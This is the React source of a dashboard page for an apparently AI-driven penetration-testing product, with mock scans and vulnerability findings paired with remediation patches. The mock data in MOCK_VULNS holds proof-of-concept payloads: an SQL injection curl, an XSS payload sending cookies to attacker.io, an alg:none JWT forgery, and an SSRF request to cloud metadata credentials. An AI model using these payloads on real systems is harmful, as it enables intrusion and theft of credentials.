'use client';
import { useState, useRef, useCallback } from 'react';
import Link from 'next/link';
import styles from './dashboard.module.css';
import Logo from '../components/Logo';
import {
  GridIcon, RadarIcon, AlertIcon, ClockIcon, PlusIcon, CheckIcon, ArrowRightIcon,
  ChevronRightIcon, DownloadIcon, CopyIcon, GlobeIcon, GitIcon, FolderIcon, LayersIcon, ListIcon,
  FileCheckIcon, type IconProps,
} from '../components/icons';

interface VulnFinding {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  cvss: number;
  type: string;
  endpoint: string;
  status: string;
  poc: string;
  description: string;
  fix: string;
  remediation?: string;
  patch: string;
}

const MOCK_SCANS = [
  {
    id: 'scan-001',
    target: 'https://api.enterprise-gateway.io',
    targetType: 'Live Web Application',
    status: 'complete',
    date: '2026-09-28',
    duration: '4m 12s',
    critical: 2,
    high: 5,
    medium: 3,
    low: 7,
    score: 42,
  },
  {
    id: 'scan-002',
    target: 'https://github.com/acme-corp/billing-service',
    targetType: 'Remote Git Repository',
    status: 'complete',
    date: '2026-09-27',
    duration: '6m 38s',
    critical: 0,
    high: 2,
    medium: 8,
    low: 4,
    score: 71,
  },
  {
    id: 'scan-003',
    target: 'https://staging.enterprise-auth.io',
    targetType: 'White-Box Correlated',
    status: 'complete',
    date: '2026-09-25',
    duration: '3m 55s',
    critical: 1,
    high: 3,
    medium: 2,
    low: 1,
    score: 55,
  },
];

const MOCK_VULNS: VulnFinding[] = [
  {
    id: 'v1',
    title: 'Broken Object Level Authorization (BOLA) & SQL Injection in /api/v2/orders',
    severity: 'critical',
    cvss: 9.8,
    type: 'Access Control & Injection (CWE-89 / CWE-639)',
    endpoint: 'GET /api/v2/orders/:id?includeDetails=true',
    status: 'open',
    poc: "curl -X GET 'https://api.enterprise-gateway.io/api/v2/orders/1042?includeDetails=1%27%20OR%201=1--' -H 'Authorization: Bearer <unprivileged_token>'",
    description: 'The endpoint does not validate whether the authenticated user owns order resource ID 1042. Furthermore, query parameters are concatenated directly into a database execution buffer without parameterization, permitting arbitrary database exfiltration.',
    fix: '1. Implement strict tenant claim validation against session context.\n2. Utilize parameterized ORM / query builders.\n3. Add centralized object-level authorization middleware.\n4. Enable rate-limiting and audit logging.',
    patch: `--- a/src/controllers/orderController.ts\n+++ b/src/controllers/orderController.ts\n@@ -18,6 +18,12 @@\n export async function getOrderDetails(req: AuthenticatedRequest, res: Response) {\n   const { id } = req.params;\n+  const sessionUserId = req.user.id;\n+\n+  // Verify tenant ownership\n+  const isOwner = await verifyOrderOwnership(sessionUserId, id);\n+  if (!isOwner) return res.status(403).json({ error: 'Access denied to order resource' });\n+\n-  const order = await db.raw("SELECT * FROM orders WHERE id = '" + id + "'");\n+  const order = await db('orders').where({ id, user_id: sessionUserId }).first();\n   return res.json(order);\n }`
  },
  {
    id: 'v2',
    title: 'Stored Cross-Site Scripting (XSS) in Tenant Notification Profile',
    severity: 'critical',
    cvss: 9.1,
    type: 'Cross-Site Scripting (CWE-79)',
    endpoint: 'POST /api/v2/tenants/settings/notifications',
    status: 'open',
    poc: '{"notificationTemplate": "<img src=x onerror=\\"fetch(\'https://attacker.io/steal?\'+document.cookie)\\">"}',
    description: 'User-controlled notification payloads are stored without sanitization and rendered in unescaped HTML email and portal templates, allowing arbitrary script execution within admin sessions.',
    fix: '1. Pass inputs through DOMPurify / server-side HTML sanitizer.\n2. Apply strict Content-Security-Policy (CSP).\n3. Use parameterized string templates.',
    patch: `--- a/src/services/notificationService.ts\n+++ b/src/services/notificationService.ts\n@@ -8,3 +8,4 @@\n+import DOMPurify from 'isomorphic-dompurify';\n export function formatNotification(template: string) {\n-  return \`<div>\${template}</div>\`;\n+  const clean = DOMPurify.sanitize(template);\n+  return \`<div>\${clean}</div>\`;\n }`
  },
  {
    id: 'v3',
    title: 'JWT Algorithm Confusion and Missing Signature Verification',
    severity: 'high',
    cvss: 8.4,
    type: 'Authentication & Cryptography (CWE-347)',
    endpoint: 'POST /api/v2/auth/verify-token',
    status: 'open',
    poc: 'Header: {"alg":"none","typ":"JWT"}\nPayload: {"sub":"admin@enterprise.com","role":"superadmin"}',
    description: 'The authentication filter accepts insecure algorithm headers ("none" and symmetric HMAC keys where RSA asymmetric public keys are expected), allowing unauthenticated signature forgery.',
    fix: '1. Enforce strict RS256/Ed25519 asymmetric algorithm verification.\n2. Reject tokens specifying "none" or algorithm mismatches.\n3. Verify token expiration and issuer audience claims.',
    patch: `--- a/src/middleware/authMiddleware.ts\n+++ b/src/middleware/authMiddleware.ts\n@@ -14,4 +14,5 @@\n export function verifyAuth(token: string) {\n-  return jwt.decode(token);\n+  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {\n    algorithms: ['RS256'],\n    issuer: 'enterprise-auth'\n  });\n }`
  },
  {
    id: 'v4',
    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
    severity: 'high',
    cvss: 7.8,
    type: 'Server-Side Request Forgery (CWE-918)',
    endpoint: 'POST /api/v2/integrations/webhooks/test',
    status: 'open',
    poc: '{"targetUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    description: 'The webhook tester accepts internal IP ranges and cloud metadata IP addresses (169.254.169.254, localhost, private RFC-1918 subnets), allowing exfiltration of cloud credentials.',
    fix: '1. Validate URL against an allowed scheme (HTTPS only).\n2. Resolve DNS and block private IP address ranges (0.0.0.0/8, 10.0.0.0/8, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16).\n3. Execute outbound webhooks via an egress proxy.',
    patch: `--- a/src/services/webhookDispatcher.ts\n+++ b/src/services/webhookDispatcher.ts\n@@ -22,3 +22,4 @@\n export async function dispatchWebhook(url: string) {\n+  await assertPublicEgressUrl(url);\n   return axios.post(url, payload, { timeout: 4000 });\n }`
  },
  {
    id: 'v5',
    title: 'Missing Rate Limiting on Password Reset Endpoint',
    severity: 'medium',
    cvss: 6.2,
    type: 'Rate Limiting & Abuse (CWE-307)',
    endpoint: 'POST /api/v2/auth/request-reset',
    status: 'open',
    poc: 'Automated flood test of 500 requests within 10 seconds returned 200 OK without throttling.',
    description: 'The endpoint lacks client IP and email identity rate limits, permitting denial of service and enumeration attacks.',
    fix: '1. Implement Redis-backed sliding window rate limiter.\n2. Cap requests at 5 attempts per 15-minute window per IP/Email.\n3. Return consistent generic response to prevent account enumeration.',
    patch: `--- a/src/routes/authRoutes.ts\n+++ b/src/routes/authRoutes.ts\n@@ -10,3 +10,4 @@\n+import { rateLimit } from '../middleware/rateLimiter';\n-router.post('/request-reset', handleReset);\n+router.post('/request-reset', rateLimit({ max: 5, windowMs: 15 * 60 * 1000 }), handleReset);`
  },
];

type Tab = 'overview' | 'new-scan' | 'findings' | 'history';
type ScanType = 'live-url' | 'github-repo' | 'local-dir' | 'whitebox' | 'target-list';
type ScanMode = 'quick' | 'standard' | 'deep';
type Severity = 'critical' | 'high' | 'medium' | 'low';

const NAV_ITEMS: { id: Tab; label: string; short: string; icon: (p: IconProps) => React.ReactElement }[] = [
  { id: 'overview', label: 'Overview', short: 'Overview', icon: GridIcon },
  { id: 'new-scan', label: 'New scan', short: 'New scan', icon: RadarIcon },
  { id: 'findings', label: 'Findings', short: 'Findings', icon: AlertIcon },
  { id: 'history', label: 'Scan history', short: 'History', icon: ClockIcon },
];

const PAGE_META: Record<Tab, { title: string; sub: string }> = {
  overview: { title: 'Overview', sub: 'Your security posture across all targets' },
  'new-scan': { title: 'New scan', sub: 'Configure an autonomous penetration test' },
  findings: { title: 'Findings', sub: 'Verified vulnerabilities and remediation' },
  history: { title: 'Scan history', sub: 'Past scans and remediation packages' },
};

const STATS: { label: string; value: string; hint: string; tone: 'neutral' | 'critical' | 'high' | 'good'; icon: (p: IconProps) => React.ReactElement }[] = [
  { label: 'Completed scans', value: '7', hint: 'Across 3 targets', tone: 'neutral', icon: RadarIcon },
  { label: 'Critical findings', value: '3', hint: 'Verified with PoC', tone: 'critical', icon: AlertIcon },
  { label: 'High findings', value: '10', hint: 'Verified with PoC', tone: 'high', icon: AlertIcon },
  { label: 'Fixes generated', value: '12', hint: 'Patches & guides ready', tone: 'good', icon: FileCheckIcon },
];

const TARGET_TYPES: { id: ScanType; label: string; badge: string; desc: string; icon: (p: IconProps) => React.ReactElement }[] = [
  { id: 'live-url', label: 'Web application', badge: 'Black-box', desc: 'Production or staging URLs, SPAs and public API gateways.', icon: GlobeIcon },
  { id: 'github-repo', label: 'Git repository', badge: 'Source', desc: 'GitHub, GitLab or Bitbucket — logic bugs, secrets and taint flaws.', icon: GitIcon },
  { id: 'local-dir', label: 'Local directory', badge: 'Pre-deploy', desc: 'Application folders and packages before they ship.', icon: FolderIcon },
  { id: 'whitebox', label: 'White-box hybrid', badge: 'Deepest', desc: 'Source code and a live URL together for code-informed exploits.', icon: LayersIcon },
  { id: 'target-list', label: 'Target list', badge: 'Bulk', desc: 'Many services, endpoints or hosts in one run.', icon: ListIcon },
];

const MODEL_OPTIONS = [
  { value: 'anthropic/claude-sonnet-4-6', label: 'Anthropic Claude', desc: 'Deep AST code comprehension and precise fix generation' },
  { value: 'openai/gpt-4o', label: 'OpenAI GPT-4o', desc: 'Fast exploratory attack graphs and dynamic fuzzing' },
  { value: 'ensemble', label: 'Frontier AI Ensemble', desc: 'Anthropic code tracing correlated with OpenAI attack hypotheses' },
];

const DEPTH_OPTIONS: { value: ScanMode; label: string; time: string; desc: string }[] = [
  { value: 'quick', label: 'Quick', time: '~5 min', desc: 'OWASP surface, auth endpoints and rapid parameter testing' },
  { value: 'standard', label: 'Standard', time: '~15 min', desc: 'Full authentication boundaries, injection vectors and API mapping' },
  { value: 'deep', label: 'Deep', time: '~45 min', desc: 'Multi-step exploit chains and correlated white-box taint analysis' },
];

const SEVERITY_LABEL: Record<Severity, string> = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low' };

function SeverityPill({ level, count }: { level: Severity; count?: number }) {
  return (
    <span className={`${styles.sev} ${styles[`sev_${level}`]}`}>
      {count !== undefined && <strong>{count}</strong>} {SEVERITY_LABEL[level]}
    </span>
  );
}

function diffLineClass(line: string) {
  if (line.startsWith('+++') || line.startsWith('---')) return styles.diffFile;
  if (line.startsWith('@@')) return styles.diffHunk;
  if (line.startsWith('+')) return styles.diffAdd;
  if (line.startsWith('-')) return styles.diffDel;
  return styles.diffCtx;
}

type ScanStatus = 'idle' | 'running' | 'complete' | 'error';

interface ScanProgress {
  status: ScanStatus;
  phase: string;
  progress: number;
  messages: string[];
  findings: number;
  tokens: number;
}

export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState<Tab>('overview');
  const [scanType, setScanType] = useState<ScanType>('live-url');
  
  // Target inputs
  const [targetUrl, setTargetUrl] = useState('');
  const [targetRepo, setTargetRepo] = useState('');
  const [targetDir, setTargetDir] = useState('./my-app');
  const [whiteboxRepo, setWhiteboxRepo] = useState('https://github.com/org/repo');
  const [whiteboxUrl, setWhiteboxUrl] = useState('https://your-app.com');
  const [targetListContent, setTargetListContent] = useState('');
  
  // Model & scan options
  const [aiModel, setAiModel] = useState('anthropic/claude-sonnet-4-6');
  const [scanMode, setScanMode] = useState<ScanMode>('quick');
  const [instructions, setInstructions] = useState('');

  const [scanProgress, setScanProgress] = useState<ScanProgress>({
    status: 'idle', phase: '', progress: 0, messages: [], findings: 0, tokens: 0,
  });
  const [scansList, setScansList] = useState(MOCK_SCANS);
  const [findingsList, setFindingsList] = useState<VulnFinding[]>(MOCK_VULNS);
  const [selectedScan, setSelectedScan] = useState(MOCK_SCANS[0]);
  const [selectedVuln, setSelectedVuln] = useState<VulnFinding>(MOCK_VULNS[0]);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [copyToast, setCopyToast] = useState<string | null>(null);
  const logRef = useRef<HTMLDivElement>(null);

  const [activeRunId, setActiveRunId] = useState<string | null>(null);
  const pollRef = useRef<NodeJS.Timeout | null>(null);

  const showToast = (msg: string) => {
    setCopyToast(msg);
    setTimeout(() => setCopyToast(null), 3000);
  };

  const downloadFile = (filename: string, content: string, mimeType: string) => {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`Downloaded ${filename}`);
  };

  const pollScan = useCallback(async (runId: string) => {
    try {
      const res = await fetch(`/api/scan/${runId}`);
      const data = await res.json();

      setScanProgress(prev => ({
        ...prev,
        status: data.status,
        phase: data.logs?.[data.logs.length - 1]?.split('] ').pop() || prev.phase,
        progress: data.progress,
        messages: data.logs || prev.messages,
        findings: data.findings?.length || 0,
        tokens: data.tokenInfo?.total_tokens || prev.tokens,
      }));

      if (data.findings && data.findings.length > 0) {
        const mappedFindings: VulnFinding[] = data.findings.map((f: VulnFinding) => ({
          id: f.id,
          title: f.title,
          severity: f.severity as Severity,
          cvss: f.cvss,
          type: f.type,
          endpoint: f.endpoint,
          status: f.status || 'open',
          poc: f.poc,
          description: f.description,
          fix: f.fix || f.remediation || '',
          remediation: f.remediation || f.fix || '',
          patch: f.patch,
        }));
        setFindingsList(mappedFindings);
        setSelectedVuln(mappedFindings[0]);
      }

      if (data.status === 'error') {
        if (pollRef.current) clearInterval(pollRef.current);
        setScanProgress(prev => ({
          ...prev,
          status: 'error',
          phase: data.error || 'Scan failed — check the scan log.',
        }));
        return;
      }

      if (data.status === 'complete') {
        if (pollRef.current) clearInterval(pollRef.current);
        // Add to recent scans if not present
        setScansList(prev => {
          if (prev.some(s => s.id === runId)) return prev;
          return [
            {
              id: runId,
              target: data.target || data.targets?.[0] || 'Target scope',
              targetType: (data.targetType || 'web').toUpperCase(),
              status: 'complete',
              date: new Date().toISOString().substring(0, 10),
              duration: data.duration || '3m 10s',
              critical: data.counts?.critical || 0,
              high: data.counts?.high || 0,
              medium: data.counts?.medium || 0,
              low: data.counts?.low || 0,
              score: Math.max(30, 100 - ((data.counts?.critical || 0) * 20 + (data.counts?.high || 0) * 10)),
            },
            ...prev
          ];
        });
      }
    } catch (e) {
      console.error('Poll error', e);
    }
  }, []);

  const getActiveTargets = (): { targets: string[]; targetType: string } => {
    if (scanType === 'live-url') {
      const url = targetUrl.trim() || 'https://api.enterprise-gateway.io';
      return { targets: [url], targetType: 'url' };
    }
    if (scanType === 'github-repo') {
      const repo = targetRepo.trim() || 'https://github.com/enterprise/core-api';
      return { targets: [repo], targetType: 'repo' };
    }
    if (scanType === 'local-dir') {
      const dir = targetDir.trim() || './services/auth';
      return { targets: [dir], targetType: 'dir' };
    }
    if (scanType === 'whitebox') {
      const repo = whiteboxRepo.trim() || 'https://github.com/org/repo';
      const url = whiteboxUrl.trim() || 'https://api.enterprise-gateway.io';
      return { targets: [repo, url], targetType: 'whitebox' };
    }
    if (scanType === 'target-list') {
      const lines = targetListContent.split('\n').map(l => l.trim()).filter(l => Boolean(l && !l.startsWith('#')));
      return { targets: lines.length > 0 ? lines : ['https://api.gateway.io', 'https://auth.gateway.io'], targetType: 'list' };
    }
    return { targets: ['https://api.enterprise-gateway.io'], targetType: 'url' };
  };

  const startScan = async () => {
    const { targets, targetType } = getActiveTargets();
    if (scanProgress.status === 'running') return;

    setScanProgress({
      status: 'running',
      phase: 'Initializing autonomous AI agents...',
      progress: 5,
      messages: [
        `[CONFIG] Target Architecture: ${targetType.toUpperCase()}`,
        `[CONFIG] Target Scope: ${targets.join(', ')}`,
        `[CONFIG] Frontier Reasoning Models: Anthropic Claude & OpenAI`,
        `[AGENT:RECON] Initiating endpoint discovery & surface mapping...`,
      ],
      findings: 0,
      tokens: 0,
    });
    setActiveTab('overview');

    try {
      const res = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targets,
          targetType,
          mode: scanMode,
          llm: aiModel,
          instructions: instructions || undefined,
        }),
      });
      const data = await res.json();

      if (data.error) {
        setScanProgress(prev => ({ ...prev, status: 'error', phase: `Error: ${data.error}` }));
        return;
      }

      setActiveRunId(data.runId);
      if (pollRef.current) clearInterval(pollRef.current);
      pollRef.current = setInterval(() => pollScan(data.runId), 2000);
      // Immediately run first poll
      setTimeout(() => pollScan(data.runId), 800);
    } catch (e) {
      const message = e instanceof Error ? e.message : String(e);
      setScanProgress(prev => ({ ...prev, status: 'error', phase: `Failed: ${message}` }));
    }
  };

  const scoreClass = (score: number) => {
    if (score < 40) return styles.scoreBad;
    if (score < 70) return styles.scoreWarn;
    return styles.scoreGood;
  };

  const goToFindings = (scan: typeof MOCK_SCANS[0]) => {
    setSelectedScan(scan);
    setActiveTab('findings');
  };

  const pageMeta = PAGE_META[activeTab];

  return (
    <div className={`${styles.layout} ${sidebarCollapsed ? styles.layoutCollapsed : ''}`}>
      {copyToast && (
        <div className={styles.toast} role="status">
          <CheckIcon size={14} /> {copyToast}
        </div>
      )}

      {/* Sidebar */}
      <aside className={styles.sidebar}>
        <div className={styles.sidebarHeader}>
          <Link href="/" aria-label="RedSuture home">
            <Logo showText={!sidebarCollapsed} />
          </Link>
          <button
            className={styles.collapseBtn}
            onClick={() => setSidebarCollapsed(!sidebarCollapsed)}
            aria-label={sidebarCollapsed ? 'Expand sidebar' : 'Collapse sidebar'}
            title={sidebarCollapsed ? 'Expand sidebar' : 'Collapse sidebar'}
          >
            <ChevronRightIcon size={16} />
          </button>
        </div>

        <nav className={styles.sidebarNav} aria-label="Dashboard navigation">
          {NAV_ITEMS.map(item => (
            <button
              key={item.id}
              className={`${styles.navItem} ${activeTab === item.id ? styles.navItemActive : ''}`}
              onClick={() => setActiveTab(item.id)}
            >
              <item.icon size={18} />
              {!sidebarCollapsed && <span>{item.label}</span>}
            </button>
          ))}
        </nav>

        <div className={styles.sidebarFooter}>
          <button className={`btn-primary ${styles.startScanBtn}`} onClick={() => setActiveTab('new-scan')}>
            <PlusIcon size={16} />
            {!sidebarCollapsed && <span>New scan</span>}
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <main className={styles.main}>
        <header className={styles.topBar}>
          <div>
            <h1 className={styles.pageTitle}>{pageMeta.title}</h1>
            <p className={styles.pageSub}>{pageMeta.sub}</p>
          </div>
          <div className={styles.topBarRight}>
            <button className="btn-secondary" onClick={() => downloadFile('redsuture-compliance-audit.json', JSON.stringify({ scans: scansList, findings: findingsList }, null, 2), 'application/json')}>
              <DownloadIcon size={14} /> Export audit bundle
            </button>
            <button className="btn-primary" onClick={() => setActiveTab('new-scan')}>
              <PlusIcon size={14} /> Launch scan
            </button>
          </div>
        </header>

        <div className={styles.content}>
          {/* OVERVIEW TAB */}
          {activeTab === 'overview' && (
            <div className={styles.stack}>
              <div className={styles.statsGrid}>
                {STATS.map(s => (
                  <div key={s.label} className={styles.statCard}>
                    <div className={styles.statTop}>
                      <span className={styles.statLabel}>{s.label}</span>
                      <span className={`${styles.statIcon} ${styles[`tone_${s.tone}`]}`}><s.icon size={16} /></span>
                    </div>
                    <div className={styles.statValue}>{s.value}</div>
                    <div className={styles.statHint}>{s.hint}</div>
                  </div>
                ))}
              </div>

              {scanProgress.status !== 'idle' && (
                <section className={styles.panel}>
                  <div className={styles.liveHeader}>
                    <div className={styles.liveIndicator}>
                      {scanProgress.status === 'running' && <><span className={styles.liveDot} /> Scan in progress</>}
                      {scanProgress.status === 'complete' && <span className={styles.liveDone}><CheckIcon size={14} /> Scan complete</span>}
                      {scanProgress.status === 'error' && <span className={styles.liveError}><AlertIcon size={14} /> Scan failed</span>}
                    </div>
                    <span className={styles.livePhase}>{scanProgress.phase}</span>
                    <span className={styles.liveProgress}>{scanProgress.progress}%</span>
                  </div>
                  <div className={styles.progressBar}>
                    <div className={styles.progressFill} style={{ width: `${scanProgress.progress}%` }} />
                  </div>
                  <div className={styles.scanLog} ref={logRef}>
                    {scanProgress.messages.map((msg, i) => (
                      <div key={i} className={styles.logLine}>
                        <span className={styles.logTag}>{msg.split(']')[0]}]</span>
                        <span className={`${styles.logMsg} ${msg.includes('AGENT') || msg.includes('AI') ? styles.logAgent : msg.includes('complete') ? styles.logSuccess : ''}`}>
                          {msg.split(']')[1] || msg}
                        </span>
                      </div>
                    ))}
                  </div>
                  <div className={styles.scanMeta}>
                    <span>{scanProgress.findings} verified findings</span>
                    <span>{(scanProgress.tokens / 1000).toFixed(0)}K tokens used</span>
                    {activeRunId && <span>Run <code>{activeRunId}</code></span>}
                  </div>
                </section>
              )}

              <section className={styles.panel}>
                <div className={styles.panelHeader}>
                  <h2 className={styles.panelTitle}>Recent scans</h2>
                  <button className="btn-ghost" onClick={() => setActiveTab('history')}>
                    View all <ArrowRightIcon size={14} />
                  </button>
                </div>
                <ul className={styles.scanList}>
                  {scansList.map(scan => (
                    <li key={scan.id}>
                      <button className={styles.scanRow} onClick={() => goToFindings(scan)}>
                        <span className={styles.scanTarget}>
                          <span className={styles.scanTargetUrl}>{scan.target}</span>
                          <span className={styles.scanDate}>{scan.targetType} · {scan.date} · {scan.duration}</span>
                        </span>
                        <span className={styles.scanBadges}>
                          {scan.critical > 0 && <SeverityPill level="critical" count={scan.critical} />}
                          {scan.high > 0 && <SeverityPill level="high" count={scan.high} />}
                          {scan.medium > 0 && <SeverityPill level="medium" count={scan.medium} />}
                        </span>
                        <span className={`${styles.scanScore} ${scoreClass(scan.score)}`}>{scan.score}<small>/100</small></span>
                        <ChevronRightIcon className={styles.rowChevron} />
                      </button>
                    </li>
                  ))}
                </ul>
              </section>
            </div>
          )}

          {/* NEW SCAN TAB */}
          {activeTab === 'new-scan' && (
            <div className={styles.newScan}>
              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>1</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>Target architecture</h2>
                    <p className={styles.formSectionDesc}>Select the digital asset surface you want autonomous agents to test.</p>
                  </div>
                </div>
                <div className={styles.targetGrid} role="radiogroup" aria-label="Target type">
                  {TARGET_TYPES.map(t => (
                    <button
                      key={t.id}
                      type="button"
                      role="radio"
                      aria-checked={scanType === t.id}
                      className={`${styles.targetCard} ${scanType === t.id ? styles.targetCardActive : ''}`}
                      onClick={() => setScanType(t.id)}
                    >
                      <span className={styles.targetCardTop}>
                        <span className={styles.targetCardIcon}><t.icon size={18} /></span>
                        <span className={styles.targetCardBadge}>{t.badge}</span>
                      </span>
                      <span className={styles.targetCardLabel}>{t.label}</span>
                      <span className={styles.targetCardDesc}>{t.desc}</span>
                    </button>
                  ))}
                </div>
              </section>

              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>2</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>Scope configuration</h2>
                    <p className={styles.formSectionDesc}>Scan only digital assets within your authorized organizational perimeter.</p>
                  </div>
                </div>

                {scanType === 'live-url' && (
                  <div className={styles.field}>
                    <label htmlFor="target-url" className={styles.inputLabel}>
                      Application / API Gateway URL <span className={styles.inputHint}>HTTPS target address</span>
                    </label>
                    <input id="target-url" type="url" className={styles.input} placeholder="https://api.enterprise-gateway.io" value={targetUrl} onChange={e => setTargetUrl(e.target.value)} />
                  </div>
                )}

                {scanType === 'github-repo' && (
                  <div className={styles.field}>
                    <label htmlFor="target-repo" className={styles.inputLabel}>
                      Source Code Repository <span className={styles.inputHint}>GitHub, GitLab, or Bitbucket HTTPS URL</span>
                    </label>
                    <input id="target-repo" type="url" className={styles.input} placeholder="https://github.com/enterprise/billing-service" value={targetRepo} onChange={e => setTargetRepo(e.target.value)} />
                  </div>
                )}

                {scanType === 'local-dir' && (
                  <div className={styles.field}>
                    <label htmlFor="target-dir" className={styles.inputLabel}>
                      Local Codebase Path <span className={styles.inputHint}>Workspace or pre-deployment path</span>
                    </label>
                    <input id="target-dir" type="text" className={styles.input} placeholder="./services/billing-service" value={targetDir} onChange={e => setTargetDir(e.target.value)} />
                  </div>
                )}

                {scanType === 'whitebox' && (
                  <div className={styles.twoCol}>
                    <div className={styles.field}>
                      <label htmlFor="wb-repo" className={styles.inputLabel}>Repository URL</label>
                      <input id="wb-repo" type="url" className={styles.input} placeholder="https://github.com/enterprise/auth-api" value={whiteboxRepo} onChange={e => setWhiteboxRepo(e.target.value)} />
                    </div>
                    <div className={styles.field}>
                      <label htmlFor="wb-url" className={styles.inputLabel}>Live Staging URL</label>
                      <input id="wb-url" type="url" className={styles.input} placeholder="https://staging.enterprise-auth.io" value={whiteboxUrl} onChange={e => setWhiteboxUrl(e.target.value)} />
                    </div>
                  </div>
                )}

                {scanType === 'target-list' && (
                  <div className={styles.field}>
                    <label htmlFor="target-list-txt" className={styles.inputLabel}>
                      Target List <span className={styles.inputHint}>One URL, IP, or repository per line</span>
                    </label>
                    <textarea
                      id="target-list-txt"
                      className={styles.textarea}
                      rows={5}
                      placeholder={`https://api.enterprise.com\nhttps://auth.enterprise.com\nhttps://billing.enterprise.com`}
                      value={targetListContent}
                      onChange={e => setTargetListContent(e.target.value)}
                    />
                  </div>
                )}
              </section>

              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>3</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>AI reasoning model &amp; depth</h2>
                    <p className={styles.formSectionDesc}>Configure frontier reasoning models and autonomous scan intensity.</p>
                  </div>
                </div>

                <div className={styles.twoCol}>
                  <div className={styles.field}>
                    <label htmlFor="ai-model" className={styles.inputLabel}>Reasoning engine</label>
                    <select id="ai-model" className={styles.select} value={aiModel} onChange={e => setAiModel(e.target.value)}>
                      {MODEL_OPTIONS.map(m => (
                        <option key={m.value} value={m.value}>{m.label} — {m.desc}</option>
                      ))}
                    </select>
                  </div>

                  <div className={styles.field}>
                    <label htmlFor="scan-mode" className={styles.inputLabel}>Test depth</label>
                    <select id="scan-mode" className={styles.select} value={scanMode} onChange={e => setScanMode(e.target.value as ScanMode)}>
                      {DEPTH_OPTIONS.map(d => (
                        <option key={d.value} value={d.value}>{d.label} ({d.time}) — {d.desc}</option>
                      ))}
                    </select>
                  </div>
                </div>

                <div className={styles.field} style={{ marginTop: '16px' }}>
                  <label htmlFor="instructions" className={styles.inputLabel}>
                    Custom instructions <span className={styles.inputHint}>Optional credentials, scope limits, or auth headers</span>
                  </label>
                  <input
                    id="instructions"
                    type="text"
                    className={styles.input}
                    placeholder="e.g. Focus on tenant isolation in /v2/orders, do not delete user accounts"
                    value={instructions}
                    onChange={e => setInstructions(e.target.value)}
                  />
                </div>
              </section>

              <div className={styles.formActions}>
                <button
                  type="button"
                  className={`btn-primary ${styles.launchBtn}`}
                  disabled={scanProgress.status === 'running'}
                  onClick={startScan}
                >
                  <RadarIcon size={16} />
                  {scanProgress.status === 'running' ? 'Autonomous Scan in Progress…' : 'Launch Autonomous Assessment'}
                </button>
              </div>
            </div>
          )}

          {/* FINDINGS TAB */}
          {activeTab === 'findings' && (
            <div className={styles.stack}>
              <section className={styles.findingsHeader}>
                <div className={styles.findingsMeta}>
                  <div className={styles.summaryLabel}>Active target</div>
                  <div className={styles.findingsTarget}>{selectedScan.target}</div>
                  <div className={styles.findingsDate}>{selectedScan.targetType} · Scanned {selectedScan.date}</div>
                </div>
                <div className={styles.findingsBadges}>
                  <SeverityPill level="critical" count={findingsList.filter(f => f.severity === 'critical').length} />
                  <SeverityPill level="high" count={findingsList.filter(f => f.severity === 'high').length} />
                  <SeverityPill level="medium" count={findingsList.filter(f => f.severity === 'medium').length} />
                </div>
                <div className={styles.securityScore}>
                  <span>Security posture score</span>
                  <span className={`${styles.scoreValue} ${scoreClass(selectedScan.score)}`}>{selectedScan.score}<small>/100</small></span>
                </div>
              </section>

              <div className={styles.findingsLayout}>
                <ul className={styles.vulnList}>
                  {findingsList.map(v => (
                    <li key={v.id}>
                      <button
                        className={`${styles.vulnCard} ${selectedVuln?.id === v.id ? styles.vulnCardSelected : ''}`}
                        onClick={() => setSelectedVuln(v)}
                        aria-current={selectedVuln?.id === v.id ? 'true' : undefined}
                      >
                        <span className={styles.vulnCardTop}>
                          <SeverityPill level={v.severity as Severity} />
                          <span className={styles.cvssScore}>CVSS {v.cvss}</span>
                        </span>
                        <span className={styles.vulnTitle}>{v.title}</span>
                        <code className={styles.vulnEndpoint}>{v.endpoint}</code>
                      </button>
                    </li>
                  ))}
                </ul>

                <article className={styles.vulnDetail}>
                  <header className={styles.vulnDetailHeader}>
                    <div className={styles.vulnDetailTags}>
                      <SeverityPill level={selectedVuln.severity as Severity} />
                      <span className={styles.detailTag}>CVSS {selectedVuln.cvss}</span>
                      <span className={styles.detailTagOk}><CheckIcon size={12} /> PoC sandbox verified</span>
                    </div>
                    <h2 className={styles.vulnDetailTitle}>{selectedVuln.title}</h2>
                    <dl className={styles.vulnDetailMeta}>
                      <div><dt>Category</dt><dd>{selectedVuln.type}</dd></div>
                      <div><dt>Endpoint</dt><dd><code className={styles.inlineCode}>{selectedVuln.endpoint}</code></dd></div>
                    </dl>
                  </header>

                  <div className={styles.downloadBar}>
                    <div className={styles.downloadBarTitle}>
                      <strong>Downloadable remediation package</strong>
                      <span>Export this finding in your organization&apos;s preferred format</span>
                    </div>
                    <div className={styles.downloadButtons}>
                      <button className={styles.downloadBtn} onClick={() => downloadFile(`${selectedVuln.id}-code-fix.patch`, selectedVuln.patch, 'text/plain')}>
                        <DownloadIcon size={14} /> Patch <code>.patch</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFile(
                          `${selectedVuln.id}-remediation-guide.md`,
